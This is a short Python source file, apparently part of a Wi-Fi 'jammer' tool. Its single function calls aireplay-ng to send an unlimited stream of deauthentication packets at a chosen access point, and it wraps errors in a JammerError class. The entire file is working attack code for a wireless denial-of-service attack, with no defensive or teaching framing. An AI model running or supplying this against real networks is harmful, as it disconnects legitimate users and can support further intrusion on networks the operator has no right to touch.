import typer
import subprocess
from errors import JammerError

def deauth(bssid, interface="wlan0mon"):
    try:
        typer.echo("[...] Sending deauth packets")
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, interface], check=True)
        typer.echo("[...] Deauth packets sent successfully")
    
    except subprocess.CalledProcessError as subprocessError:
        raise JammerError(f"[!] Failed to send deauth packets: {subprocessError}")
    except JammerError as error:
        raise JammerError(f"[!] Jammer error: {error}")